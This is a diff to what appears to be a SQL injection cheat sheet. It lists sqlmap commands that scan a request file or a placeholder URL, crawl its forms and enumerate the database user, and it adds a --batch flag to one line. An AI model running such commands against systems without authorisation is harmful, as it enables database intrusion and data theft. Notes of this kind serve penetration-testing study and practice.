@@ -36,7 +36,7 @@ we use ', --, OR, UNION, etc... to interrupt the sql query. if not properly sani
 # intercepting login pages is a good choice. a failed one!
 sqlmap -r req.txt --batch --banner         # Basic check for DB version
 sqlmap -r req.txt --level=3 --risk=2 --dbs # Deep scan (checks Headers/Cookies)
-sqlmap -u "http://target.com/id=1" --forms --crawl=2 # Spidering 
+sqlmap -u "http://target.com/id=1" --forms --crawl=2 --batch # Spidering 
 
 # 2. ENUMERATION
 sqlmap -r req.txt --current-user --current-db --is-dba # situational awareness
